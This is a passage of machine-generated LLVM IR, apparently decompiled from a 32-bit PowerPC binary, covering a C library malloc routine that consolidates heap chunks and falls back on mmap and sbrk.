  %v0_1000b38810 = phi i32 [ %v1_1000b380, %dec_label_pc_1000b374 ], [ %v0_1000b38810.pre, %dec_label_pc_1000b334.dec_label_pc_1000b390.preheader_crit_edge ]
  %v0_1000b3a8 = phi i32 [ %v3_1000b368, %dec_label_pc_1000b374 ], [ %v1_1000b32c, %dec_label_pc_1000b334.dec_label_pc_1000b390.preheader_crit_edge ]
  %r0.promoted = phi i32 [ 1, %dec_label_pc_1000b374 ], [ %v0_1000b334, %dec_label_pc_1000b334.dec_label_pc_1000b390.preheader_crit_edge ]
  %v2_1000b3906 = and i32 %r0.promoted, %v0_1000b3a8
  store i32 %v2_1000b3906, i32* %r10.global-to-local, align 4
  %v5_1000b3909 = icmp eq i32 %v2_1000b3906, 0
  store i1 %v5_1000b3909, i1* %cr0_eq.global-to-local, align 1
  br i1 %v5_1000b3909, label %dec_label_pc_1000b388, label %dec_label_pc_1000b398

dec_label_pc_1000b388:                            ; preds = %dec_label_pc_1000b390.preheader, %dec_label_pc_1000b388
  %v1_1000b38c23 = phi i32 [ %v1_1000b38c, %dec_label_pc_1000b388 ], [ %r0.promoted, %dec_label_pc_1000b390.preheader ]
  %v0_1000b38811 = phi i32 [ %v1_1000b388, %dec_label_pc_1000b388 ], [ %v0_1000b38810, %dec_label_pc_1000b390.preheader ]
  %v1_1000b388 = add i32 %v0_1000b38811, 8
  %v1_1000b38c = mul i32 %v1_1000b38c23, 2
  %v2_1000b390 = and i32 %v1_1000b38c, %v0_1000b3a8
  %v5_1000b390 = icmp eq i32 %v2_1000b390, 0
  br i1 %v5_1000b390, label %dec_label_pc_1000b388, label %dec_label_pc_1000b390.dec_label_pc_1000b398_crit_edge

dec_label_pc_1000b390.dec_label_pc_1000b398_crit_edge: ; preds = %dec_label_pc_1000b388
  store i32 %v1_1000b388, i32* @r11, align 4
  store i32 %v1_1000b38c, i32* %r0.global-to-local, align 4
  store i32 %v2_1000b390, i32* %r10.global-to-local, align 4
  store i1 false, i1* %cr0_eq.global-to-local, align 1
  br label %dec_label_pc_1000b398

dec_label_pc_1000b398:                            ; preds = %dec_label_pc_1000b390.dec_label_pc_1000b398_crit_edge, %dec_label_pc_1000b390.preheader
  %v0_1000b3b4 = phi i32 [ %v1_1000b38c, %dec_label_pc_1000b390.dec_label_pc_1000b398_crit_edge ], [ %r0.promoted, %dec_label_pc_1000b390.preheader ]
  %v0_1000b388.lcssa = phi i32 [ %v1_1000b388, %dec_label_pc_1000b390.dec_label_pc_1000b398_crit_edge ], [ %v0_1000b38810, %dec_label_pc_1000b390.preheader ]
  %v1_1000b398 = add i32 %v0_1000b388.lcssa, 12
  %v2_1000b398 = inttoptr i32 %v1_1000b398 to i32*
  %v3_1000b398 = load i32, i32* %v2_1000b398, align 4
  store i32 %v3_1000b398, i32* %r6.global-to-local, align 4
  %v4_1000b39c = icmp eq i32 %v3_1000b398, %v0_1000b388.lcssa
  br i1 %v4_1000b39c, label %dec_label_pc_1000b3a4, label %dec_label_pc_1000b3c0

dec_label_pc_1000b3a4:                            ; preds = %dec_label_pc_1000b398
  %v0_1000b3a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000b3a4 = mul i32 %v0_1000b3a4, 4
  %v2_1000b3a8 = sub i32 -1, %v0_1000b3b4
  %v3_1000b3a8 = and i32 %v0_1000b3a8, %v2_1000b3a8
  store i32 %v3_1000b3a8, i32* %r5.global-to-local, align 4
  %v1_1000b3ac = load i32, i32* %r7.global-to-local, align 4
  %v2_1000b3ac = add i32 %v1_1000b3ac, %v1_1000b3a4
  store i32 %v2_1000b3ac, i32* %r9.global-to-local, align 4
  %v1_1000b3b0 = add i32 %v0_1000b388.lcssa, 8
  store i32 %v1_1000b3b0, i32* @r11, align 4
  %v1_1000b3b4 = mul i32 %v0_1000b3b4, 2
  store i32 %v1_1000b3b4, i32* %r0.global-to-local, align 4
  %v2_1000b3b8 = add i32 %v2_1000b3ac, 820
  %v3_1000b3b8 = inttoptr i32 %v2_1000b3b8 to i32*
  store i32 %v3_1000b3a8, i32* %v3_1000b3b8, align 4
  %v0_1000b32c.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b32c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000b32c

dec_label_pc_1000b3c0:                            ; preds = %dec_label_pc_1000b398
  %v3_1000b39c = icmp sgt i32 %v3_1000b398, %v0_1000b388.lcssa
  store i1 %v3_1000b39c, i1* %cr7_gt.global-to-local, align 1
  %v1_1000b3c0 = add i32 %v3_1000b398, 4
  %v2_1000b3c0 = inttoptr i32 %v1_1000b3c0 to i32*
  %v3_1000b3c0 = load i32, i32* %v2_1000b3c0, align 4
  store i32 %v3_1000b3c0, i32* %r0.global-to-local, align 4
  %v1_1000b3c4 = add i32 %v3_1000b398, 12
  %v2_1000b3c4 = inttoptr i32 %v1_1000b3c4 to i32*
  %v3_1000b3c4 = load i32, i32* %v2_1000b3c4, align 4
  store i32 %v3_1000b3c4, i32* %r9.global-to-local, align 4
  %v1_1000b3c8 = call i32 @__asm_rlwinm(i32 %v3_1000b3c0, i32 0, i32 0, i32 29)
  store i32 %v1_1000b3c8, i32* %r0.global-to-local, align 4
  %v0_1000b3cc = load i32, i32* @r26, align 4
  %v2_1000b3cc = sub i32 %v1_1000b3c8, %v0_1000b3cc
  store i32 %v2_1000b3cc, i32* @r8, align 4
  %v0_1000b3d0 = load i32, i32* @r11, align 4
  %v1_1000b3d0 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b3d0 = add i32 %v1_1000b3d0, 8
  %v3_1000b3d0 = inttoptr i32 %v2_1000b3d0 to i32*
  store i32 %v0_1000b3d0, i32* %v3_1000b3d0, align 4
  %v0_1000b3d4 = load i32, i32* @r8, align 4
  %v2_1000b3d4 = icmp ugt i32 %v0_1000b3d4, 15
  store i1 %v2_1000b3d4, i1* %cr7_gt.global-to-local, align 1
  %v0_1000b3d8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b3d8 = load i32, i32* @r11, align 4
  %v2_1000b3d8 = add i32 %v1_1000b3d8, 12
  %v3_1000b3d8 = inttoptr i32 %v2_1000b3d8 to i32*
  store i32 %v0_1000b3d8, i32* %v3_1000b3d8, align 4
  br i1 %v2_1000b3d4, label %dec_label_pc_1000b3f0, label %dec_label_pc_1000b3e0

dec_label_pc_1000b3e0:                            ; preds = %dec_label_pc_1000b3c0
  %v0_1000b3e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000b3e0 = add i32 %v0_1000b3e0, %v1_1000b3c8
  store i32 %v2_1000b3e0, i32* %r9.global-to-local, align 4
  %v1_1000b3e4 = add i32 %v0_1000b3e0, 8
  store i32 %v1_1000b3e4, i32* @r30, align 4
  %v1_1000b3e8 = add i32 %v2_1000b3e0, 4
  %v2_1000b3e8 = inttoptr i32 %v1_1000b3e8 to i32*
  %v3_1000b3e8 = load i32, i32* %v2_1000b3e8, align 4
  store i32 %v3_1000b3e8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000b2ac

dec_label_pc_1000b3f0:                            ; preds = %dec_label_pc_1000b3c0
  %v0_1000b3f0 = load i32, i32* @r26, align 4
  %v2_1000b3f0 = icmp ugt i32 %v0_1000b3f0, 255
  store i1 %v2_1000b3f0, i1* %cr7_gt.global-to-local, align 1
  %v0_1000b3f4 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000b3f4 = add i32 %v0_1000b3f4, %v0_1000b3f0
  store i32 %v2_1000b3f4, i32* @r11, align 4
  %v1_1000b3f8 = load i32, i32* @r31, align 4
  %v2_1000b3f8 = add i32 %v1_1000b3f8, 8
  %v3_1000b3f8 = inttoptr i32 %v2_1000b3f8 to i32*
  store i32 %v2_1000b3f4, i32* %v3_1000b3f8, align 4
  %v0_1000b3fc = load i32, i32* @r11, align 4
  %v1_1000b3fc = load i32, i32* @r31, align 4
  %v2_1000b3fc = add i32 %v1_1000b3fc, 12
  %v3_1000b3fc = inttoptr i32 %v2_1000b3fc to i32*
  store i32 %v0_1000b3fc, i32* %v3_1000b3fc, align 4
  %v0_1000b400 = load i32, i32* @r31, align 4
  %v1_1000b400 = load i32, i32* @r11, align 4
  %v2_1000b400 = add i32 %v1_1000b400, 8
  %v3_1000b400 = inttoptr i32 %v2_1000b400 to i32*
  store i32 %v0_1000b400, i32* %v3_1000b400, align 4
  %v0_1000b404 = load i32, i32* @r31, align 4
  %v1_1000b404 = load i32, i32* @r11, align 4
  %v2_1000b404 = add i32 %v1_1000b404, 12
  %v3_1000b404 = inttoptr i32 %v2_1000b404 to i32*
  store i32 %v0_1000b404, i32* %v3_1000b404, align 4
  br i1 %v2_1000b3f0, label %dec_label_pc_1000b414, label %dec_label_pc_1000b40c

dec_label_pc_1000b40c:                            ; preds = %dec_label_pc_1000b3f0
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v0_1000b410 = load i32, i32* @r11, align 4
  store i32 %v0_1000b410, i32* @global_var_10023a5c.486, align 4
  br label %dec_label_pc_1000b414

dec_label_pc_1000b414:                            ; preds = %dec_label_pc_1000b3f0, %dec_label_pc_1000b40c
  %v0_1000b414 = load i32, i32* @r26, align 4
  %v1_1000b414 = or i32 %v0_1000b414, 1
  store i32 %v1_1000b414, i32* %r9.global-to-local, align 4
  %v0_1000b418 = load i32, i32* @r8, align 4
  %v1_1000b418 = or i32 %v0_1000b418, 1
  store i32 %v1_1000b418, i32* %r0.global-to-local, align 4
  %v0_1000b41c = load i32, i32* %r6.global-to-local, align 4
  %v1_1000b41c = add i32 %v0_1000b41c, 8
  store i32 %v1_1000b41c, i32* @r30, align 4
  %v2_1000b420 = add i32 %v0_1000b41c, 4
  %v3_1000b420 = inttoptr i32 %v2_1000b420 to i32*
  store i32 %v1_1000b414, i32* %v3_1000b420, align 4
  %v0_1000b424 = load i32, i32* @r8, align 4
  %v1_1000b424 = load i32, i32* @r11, align 4
  %v3_1000b424 = add i32 %v1_1000b424, %v0_1000b424
  %v4_1000b424 = inttoptr i32 %v3_1000b424 to i32*
  store i32 %v0_1000b424, i32* %v4_1000b424, align 4
  %v0_1000b428 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b428 = load i32, i32* @r11, align 4
  %v2_1000b428 = add i32 %v1_1000b428, 4
  %v3_1000b428 = inttoptr i32 %v2_1000b428 to i32*
  store i32 %v0_1000b428, i32* %v3_1000b428, align 4
  br label %dec_label_pc_1000b898

dec_label_pc_1000b430.loopexit:                   ; preds = %dec_label_pc_1000b358
  store i1 %v3_1000b39c25, i1* %cr7_gt.global-to-local, align 1
  br label %dec_label_pc_1000b430

dec_label_pc_1000b430:                            ; preds = %dec_label_pc_1000b430.loopexit, %dec_label_pc_1000b038, %dec_label_pc_1000b040
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v0_1000b434 = load i32, i32* @r26, align 4
  %v1_1000b434 = add i32 %v0_1000b434, 16
  store i32 %v1_1000b434, i32* @r21, align 4
  store i32 ptrtoint (i32* @global_var_10023a2c.481 to i32), i32* @r3, align 4
  %v3_1000b43c = load i32, i32* @global_var_10023a58.487, align 4
  store i32 %v3_1000b43c, i32* %r10.global-to-local, align 4
  %v1_1000b440 = add i32 %v3_1000b43c, 4
  %v2_1000b440 = inttoptr i32 %v1_1000b440 to i32*
  %v3_1000b440 = load i32, i32* %v2_1000b440, align 4
  store i32 %v3_1000b440, i32* %r0.global-to-local, align 4
  %v1_1000b444 = call i32 @__asm_rlwinm(i32 %v3_1000b440, i32 0, i32 0, i32 29)
  store i32 %v1_1000b444, i32* %r0.global-to-local, align 4
  %v1_1000b448 = load i32, i32* @r21, align 4
  %v2_1000b448 = icmp ult i32 %v1_1000b444, %v1_1000b448
  %v3_1000b448 = icmp ugt i32 %v1_1000b444, %v1_1000b448
  store i1 %v3_1000b448, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000b448, label %dec_label_pc_1000b474, label %dec_label_pc_1000b450

dec_label_pc_1000b450:                            ; preds = %dec_label_pc_1000b430
  %v0_1000b450 = load i32, i32* @r26, align 4
  %v2_1000b450 = sub i32 %v1_1000b444, %v0_1000b450
  %v0_1000b454 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000b454 = add i32 %v0_1000b454, %v0_1000b450
  store i32 %v2_1000b454, i32* @r11, align 4
  %v1_1000b458 = or i32 %v2_1000b450, 1
  store i32 %v1_1000b458, i32* %r0.global-to-local, align 4
  %v1_1000b45c = or i32 %v0_1000b450, 1
  store i32 %v1_1000b45c, i32* %r9.global-to-local, align 4
  %v1_1000b460 = add i32 %v0_1000b454, 8
  store i32 %v1_1000b460, i32* @r30, align 4
  %v2_1000b464 = add i32 %v0_1000b454, 4
  %v3_1000b464 = inttoptr i32 %v2_1000b464 to i32*
  store i32 %v1_1000b45c, i32* %v3_1000b464, align 4
  %v0_1000b468 = load i32, i32* @r11, align 4
  store i32 %v0_1000b468, i32* @global_var_10023a58.487, align 4
  %v0_1000b46c = load i32, i32* %r0.global-to-local, align 4
  %v2_1000b46c = add i32 %v0_1000b468, 4
  %v3_1000b46c = inttoptr i32 %v2_1000b46c to i32*
  store i32 %v0_1000b46c, i32* %v3_1000b46c, align 4
  br label %dec_label_pc_1000b898

dec_label_pc_1000b474:                            ; preds = %dec_label_pc_1000b430
  %v3_1000b474 = load i32, i32* @global_var_10023a2c.481, align 4
  store i32 %v3_1000b474, i32* %r0.global-to-local, align 4
  %v3_1000b478 = load i32, i32* @global_var_10023d88.490, align 4
  store i32 %v3_1000b478, i32* @r11, align 4
  %v1_1000b47c = and i32 %v3_1000b474, 2
  store i32 %v1_1000b47c, i32* %r9.global-to-local, align 4
  %v3_1000b47c = icmp eq i32 %v1_1000b47c, 0
  store i1 %v3_1000b47c, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1000b47c, label %dec_label_pc_1000b494, label %dec_label_pc_1000b484

dec_label_pc_1000b484:                            ; preds = %dec_label_pc_1000b474
  store i32 268481672, i32* @lr, align 4
  %v0_1000b484 = call i32 @__malloc_consolidate()
  %v0_1000b488 = load i32, i32* @r26, align 4
  %v1_1000b488 = add i32 %v0_1000b488, -7
  store i32 %v1_1000b488, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000b490.491 to i32), i32* @lr, align 4
  %v1_1000b48c = call i32 @malloc(i32 %v1_1000b488)
  store i32 %v1_1000b48c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b894

dec_label_pc_1000b494:                            ; preds = %dec_label_pc_1000b474
  %v3_1000b494 = load i32, i32* @global_var_10023d78.492, align 4
  store i32 %v3_1000b494, i32* %r0.global-to-local, align 4
  %v1_1000b498 = add i32 %v3_1000b478, -1
  store i32 %v1_1000b498, i32* @r24, align 4
  %v0_1000b49c = load i32, i32* @r26, align 4
  %v2_1000b49c = icmp ult i32 %v0_1000b49c, %v3_1000b494
  %v3_1000b49c = icmp ugt i32 %v0_1000b49c, %v3_1000b494
  store i1 %v3_1000b49c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000b49c, label %dec_label_pc_1000b57c, label %dec_label_pc_1000b4a4

dec_label_pc_1000b4a4:                            ; preds = %dec_label_pc_1000b494
  %v3_1000b4a4 = load i32, i32* @global_var_10023d80.493, align 4
  store i32 %v3_1000b4a4, i32* %r0.global-to-local, align 4
  %v3_1000b4a8 = load i32, i32* @global_var_10023d7c.494, align 4
  store i32 %v3_1000b4a8, i32* %r9.global-to-local, align 4
  %v2_1000b4ac = icmp slt i32 %v3_1000b4a8, %v3_1000b4a4
  %v3_1000b4ac = icmp sgt i32 %v3_1000b4a8, %v3_1000b4a4
  store i1 %v3_1000b4ac, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000b4ac, label %dec_label_pc_1000b4b4, label %dec_label_pc_1000b57c

dec_label_pc_1000b4b4:                            ; preds = %dec_label_pc_1000b4a4
  %v1_1000b4b4 = add i32 %v3_1000b478, 10
  %v2_1000b4b8 = add i32 %v1_1000b4b4, %v0_1000b49c
  store i32 %v2_1000b4b8, i32* %r0.global-to-local, align 4
  %v2_1000b4bc = sub i32 0, %v3_1000b478
  %v3_1000b4bc = and i32 %v2_1000b4b8, %v2_1000b4bc
  store i32 %v3_1000b4bc, i32* @r31, align 4
  %v3_1000b4c0 = icmp ugt i32 %v3_1000b4bc, %v0_1000b49c
  store i1 %v3_1000b4c0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000b4c0, label %dec_label_pc_1000b4c8, label %dec_label_pc_1000b57c

dec_label_pc_1000b4c8:                            ; preds = %dec_label_pc_1000b4b4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v3_1000b4bc, i32* %r4.global-to-local, align 4
  store i32 3, i32* %r5.global-to-local, align 4
  store i32 34, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 268481764, i32* @lr, align 4
  %v6_1000b4e0 = call i32 @mmap(i32 0, i32 %v3_1000b4bc, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_1000b4e0, i32* %r3.global-to-local, align 4
  %v2_1000b4e4 = icmp sgt i32 %v6_1000b4e0, -1
  %v3_1000b4e4 = icmp eq i32 %v6_1000b4e0, -1
  store i1 %v2_1000b4e4, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000b4e4, label %dec_label_pc_1000b4c8.dec_label_pc_1000b57c_crit_edge, label %dec_label_pc_1000b4ec

dec_label_pc_1000b4c8.dec_label_pc_1000b57c_crit_edge: ; preds = %dec_label_pc_1000b4c8
  %v1_1000b59c.pre = load i32, i32* @r26, align 4
  br label %dec_label_pc_1000b57c

dec_label_pc_1000b4ec:                            ; preds = %dec_label_pc_1000b4c8
  %v1_1000b4ec = urem i32 %v6_1000b4e0, 8
  store i32 %v1_1000b4ec, i32* %r9.global-to-local, align 4
  %v3_1000b4ec = icmp eq i32 %v1_1000b4ec, 0
  store i1 %v3_1000b4ec, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1000b4ec, label %dec_label_pc_1000b50c, label %dec_label_pc_1000b4f4

dec_label_pc_1000b4f4:                            ; preds = %dec_label_pc_1000b4ec
  %v1_1000b4f4 = sub nsw i32 8, %v1_1000b4ec
  store i32 %v1_1000b4f4, i32* %r9.global-to-local, align 4
  %v1_1000b4f8 = load i32, i32* @r31, align 4
  %v2_1000b4f8 = sub i32 %v1_1000b4f8, %v1_1000b4f4
  %v2_1000b4fc = add i32 %v1_1000b4f4, %v6_1000b4e0
  store i32 %v2_1000b4fc, i32* %r10.global-to-local, align 4
  %v1_1000b500 = or i32 %v2_1000b4f8, 2
  store i32 %v1_1000b500, i32* %r0.global-to-local, align 4
  %v4_1000b504 = inttoptr i32 %v2_1000b4fc to i32*
  store i32 %v1_1000b4f4, i32* %v4_1000b504, align 4
  %v0_1000b518.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b518.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000b518

dec_label_pc_1000b50c:                            ; preds = %dec_label_pc_1000b4ec
  %v2_1000b50c = inttoptr i32 %v6_1000b4e0 to i32*
  store i32 0, i32* %v2_1000b50c, align 4
  store i32 %v6_1000b4e0, i32* %r10.global-to-local, align 4
  %v0_1000b514 = load i32, i32* @r31, align 4
  %v1_1000b514 = or i32 %v0_1000b514, 2
  store i32 %v1_1000b514, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000b518

dec_label_pc_1000b518:                            ; preds = %dec_label_pc_1000b4f4, %dec_label_pc_1000b50c
  %v1_1000b518 = phi i32 [ %v1_1000b518.pre, %dec_label_pc_1000b4f4 ], [ %v6_1000b4e0, %dec_label_pc_1000b50c ]
  %v0_1000b518 = phi i32 [ %v0_1000b518.pre, %dec_label_pc_1000b4f4 ], [ %v1_1000b514, %dec_label_pc_1000b50c ]
  %v2_1000b518 = add i32 %v1_1000b518, 4
  %v3_1000b518 = inttoptr i32 %v2_1000b518 to i32*
  store i32 %v0_1000b518, i32* %v3_1000b518, align 4
  store i32 ptrtoint (i32* @global_var_10023a2c.481 to i32), i32* @r11, align 4
  %v3_1000b524 = load i32, i32* @global_var_10023d7c.494, align 4
  %v3_1000b528 = load i32, i32* @global_var_10023d84.495, align 4
  store i32 %v3_1000b528, i32* %r0.global-to-local, align 4
  %v1_1000b52c = add i32 %v3_1000b524, 1
  store i32 %v1_1000b52c, i32* %r9.global-to-local, align 4
  %v3_1000b530 = icmp sgt i32 %v1_1000b52c, %v3_1000b528
  store i1 %v3_1000b530, i1* %cr7_gt.global-to-local, align 1
  store i32 %v1_1000b52c, i32* @global_var_10023d7c.494, align 4
  br i1 %v3_1000b530, label %dec_label_pc_1000b53c, label %dec_label_pc_1000b540

dec_label_pc_1000b53c:                            ; preds = %dec_label_pc_1000b518
  store i32 %v1_1000b52c, i32* @global_var_10023d84.495, align 4
  br label %dec_label_pc_1000b540

dec_label_pc_1000b540:                            ; preds = %dec_label_pc_1000b518, %dec_label_pc_1000b53c
  %v3_1000b540 = load i32, i32* @global_var_10023d90.496, align 4
  store i32 %v3_1000b540, i32* %r0.global-to-local, align 4
  %v3_1000b544 = load i32, i32* @global_var_10023d9c.497, align 4
  store i32 %v3_1000b544, i32* %r9.global-to-local, align 4
  %v0_1000b548 = load i32, i32* @r31, align 4
  %v2_1000b548 = add i32 %v0_1000b548, %v3_1000b540
  store i32 %v2_1000b548, i32* %r4.global-to-local, align 4
  %v3_1000b54c = icmp ugt i32 %v2_1000b548, %v3_1000b544
  store i1 %v3_1000b54c, i1* %cr7_gt.global-to-local, align 1
  store i32 %v2_1000b548, i32* @global_var_10023d90.496, align 4
  br i1 %v3_1000b54c, label %dec_label_pc_1000b558, label %dec_label_pc_1000b55c

dec_label_pc_1000b558:                            ; preds = %dec_label_pc_1000b540
  store i32 %v2_1000b548, i32* @global_var_10023d9c.497, align 4
  br label %dec_label_pc_1000b55c

dec_label_pc_1000b55c:                            ; preds = %dec_label_pc_1000b540, %dec_label_pc_1000b558
  %v3_1000b55c = load i32, i32* @global_var_10023d94.498, align 4
  %v3_1000b560 = load i32, i32* @global_var_10023da0.499, align 4
  store i32 %v3_1000b560, i32* %r9.global-to-local, align 4
  %v2_1000b564 = add i32 %v3_1000b55c, %v2_1000b548
  store i32 %v2_1000b564, i32* %r0.global-to-local, align 4
  %v3_1000b568 = icmp ugt i32 %v2_1000b564, %v3_1000b560
  store i1 %v3_1000b568, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000b568, label %dec_label_pc_1000b570, label %dec_label_pc_1000b574

dec_label_pc_1000b570:                            ; preds = %dec_label_pc_1000b55c
  store i32 %v2_1000b564, i32* @global_var_10023da0.499, align 4
  br label %dec_label_pc_1000b574

dec_label_pc_1000b574:                            ; preds = %dec_label_pc_1000b55c, %dec_label_pc_1000b570
  %v0_1000b574 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000b574 = add i32 %v0_1000b574, 8
  store i32 %v1_1000b574, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b894

dec_label_pc_1000b57c:                            ; preds = %dec_label_pc_1000b4c8.dec_label_pc_1000b57c_crit_edge, %dec_label_pc_1000b4b4, %dec_label_pc_1000b4a4, %dec_label_pc_1000b494
  %v1_1000b59c = phi i32 [ %v1_1000b59c.pre, %dec_label_pc_1000b4c8.dec_label_pc_1000b57c_crit_edge ], [ %v0_1000b49c, %dec_label_pc_1000b4b4 ], [ %v0_1000b49c, %dec_label_pc_1000b4a4 ], [ %v0_1000b49c, %dec_label_pc_1000b494 ]
  %v3_1000b584 = load i32, i32* @global_var_10023d8c.500, align 4
  store i32 %v3_1000b584, i32* %r0.global-to-local, align 4
  %v3_1000b588 = load i32, i32* @global_var_10023a58.487, align 4
  store i32 %v3_1000b588, i32* @r22, align 4
  %v1_1000b58c = urem i32 %v3_1000b584, 2
  store i32 %v1_1000b58c, i32* %r10.global-to-local, align 4
  %v3_1000b58c = icmp eq i32 %v1_1000b58c, 0
  store i1 %v3_1000b58c, i1* %cr0_eq.global-to-local, align 1
  %v3_1000b590 = load i32, i32* @global_var_10023d74.501, align 4
  store i32 %v3_1000b590, i32* %r9.global-to-local, align 4
  %v1_1000b594 = add i32 %v3_1000b588, 4
  %v2_1000b594 = inttoptr i32 %v1_1000b594 to i32*
  %v3_1000b594 = load i32, i32* %v2_1000b594, align 4
  store i32 %v3_1000b594, i32* %r0.global-to-local, align 4
  %v1_1000b598 = add i32 %v1_1000b59c, 16
  %v2_1000b59c = add i32 %v1_1000b598, %v3_1000b590
  store i32 %v2_1000b59c, i32* %r9.global-to-local, align 4
  %v1_1000b5a0 = call i32 @__asm_rlwinm(i32 %v3_1000b594, i32 0, i32 0, i32 29)
  store i32 %v1_1000b5a0, i32* @r25, align 4
  %v0_1000b5a4 = load i32, i32* %r9.global-to-local, align 4
  store i32 %v0_1000b5a4, i32* %r0.global-to-local, align 4
  %v0_1000b5a8 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000b5a8, label %dec_label_pc_1000b5b0, label %dec_label_pc_1000b5ac

dec_label_pc_1000b5ac:                            ; preds = %dec_label_pc_1000b57c
  %v2_1000b5ac = sub i32 %v0_1000b5a4, %v1_1000b5a0
  store i32 %v2_1000b5ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000b5b0

dec_label_pc_1000b5b0:                            ; preds = %dec_label_pc_1000b57c, %dec_label_pc_1000b5ac
  %v0_1000b5b0 = phi i32 [ %v0_1000b5a4, %dec_label_pc_1000b57c ], [ %v2_1000b5ac, %dec_label_pc_1000b5ac ]
  %v1_1000b5b0 = load i32, i32* @r24, align 4
  %v2_1000b5b0 = add i32 %v1_1000b5b0, %v0_1000b5b0
  store i32 %v2_1000b5b0, i32* %r0.global-to-local, align 4
  %v1_1000b5b4 = sub i32 -1, %v1_1000b5b0
  store i32 %v1_1000b5b4, i32* @r23, align 4
  %v2_1000b5b8 = and i32 %v2_1000b5b0, %v1_1000b5b4
  store i32 %v2_1000b5b8, i32* @r31, align 4
  store i32 %v2_1000b5b8, i32* @r30, align 4
  %v3_1000b5bc = icmp eq i32 %v2_1000b5b8, 0
  store i1 %v3_1000b5bc, i1* %cr0_eq.global-to-local, align 1
  %tmp81 = icmp slt i32 %v2_1000b5b8, 1
  br i1 %tmp81, label %dec_label_pc_1000b5d8, label %dec_label_pc_1000b5c4

dec_label_pc_1000b5c4:                            ; preds = %dec_label_pc_1000b5b0
  store i32 %v2_1000b5b8, i32* %r3.global-to-local, align 4
  store i32 268481996, i32* @lr, align 4
  %v1_1000b5c8 = call i32 @__GI_sbrk(i32 %v2_1000b5b8)
  store i32 %v1_1000b5c8, i32* %r3.global-to-local, align 4
  %v2_1000b5cc = icmp sgt i32 %v1_1000b5c8, -1
  %v3_1000b5cc = icmp eq i32 %v1_1000b5c8, -1
  store i1 %v2_1000b5cc, i1* %cr7_gt.global-to-local, align 1
  store i32 %v1_1000b5c8, i32* @r29, align 4
  br i1 %v3_1000b5cc, label %dec_label_pc_1000b5d8, label %dec_label_pc_1000b650

dec_label_pc_1000b5d8:                            ; preds = %dec_label_pc_1000b5c4, %dec_label_pc_1000b5b0
  store i32 ptrtoint (i32* @global_var_10023a2c.481 to i32), i32* @r28, align 4
  %v3_1000b5e0 = load i32, i32* @global_var_10023d8c.500, align 4
  store i32 %v3_1000b5e0, i32* %r0.global-to-local, align 4
  %v1_1000b5e4 = urem i32 %v3_1000b5e0, 2
  store i32 %v1_1000b5e4, i32* %r9.global-to-local, align 4
  %v3_1000b5e4 = icmp eq i32 %v1_1000b5e4, 0
  store i1 %v3_1000b5e4, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1000b5e4, label %dec_label_pc_1000b5f8thread-pre-split, label %dec_label_pc_1000b5ec

dec_label_pc_1000b5ec:                            ; preds = %dec_label_pc_1000b5d8
  %v1_1000b5ec = load i32, i32* @r24, align 4
  %v2_1000b5ec = add i32 %v1_1000b5ec, %v1_1000b5a0
  %v1_1000b5f0 = load i32, i32* @r31, align 4
  %v2_1000b5f0 = add i32 %v2_1000b5ec, %v1_1000b5f0
  store i32 %v2_1000b5f0, i32* %r0.global-to-local, align 4
  %v1_1000b5f4 = load i32, i32* @r23, align 4
  %v2_1000b5f4 = and i32 %v1_1000b5f4, %v2_1000b5f0
  store i32 %v2_1000b5f4, i32* @r30, align 4
  br label %dec_label_pc_1000b5f8

dec_label_pc_1000b5f8thread-pre-split:            ; preds = %dec_label_pc_1000b5d8
  %v0_1000b600.pr = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000b5f8

dec_label_pc_1000b5f8:                            ; preds = %dec_label_pc_1000b5f8thread-pre-split, %dec_label_pc_1000b5ec
  %v0_1000b600 = phi i32 [ %v0_1000b600.pr, %dec_label_pc_1000b5f8thread-pre-split ], [ %v2_1000b5f4, %dec_label_pc_1000b5ec ]
  store i32 1048575, i32* %r0.global-to-local, align 4
  %v3_1000b600 = icmp ugt i32 %v0_1000b600, 1048575
  store i1 %v3_1000b600, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000b600, label %dec_label_pc_1000b60c, label %dec_label_pc_1000b608

dec_label_pc_1000b608:                            ; preds = %dec_label_pc_1000b5f8
  store i32 1048576, i32* @r30, align 4
  br label %dec_label_pc_1000b60c

dec_label_pc_1000b60c:                            ; preds = %dec_label_pc_1000b5f8, %dec_label_pc_1000b608
  %v0_1000b618 = phi i32 [ %v0_1000b600, %dec_label_pc_1000b5f8 ], [ 1048576, %dec_label_pc_1000b608 ]
  %v1_1000b60c = load i32, i32* @r26, align 4
  %v3_1000b60c = icmp ugt i32 %v0_1000b618, %v1_1000b60c
